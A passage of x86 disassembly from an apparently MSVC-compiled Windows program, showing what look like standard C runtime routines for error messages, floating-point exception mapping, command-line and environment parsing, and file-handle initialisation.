  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
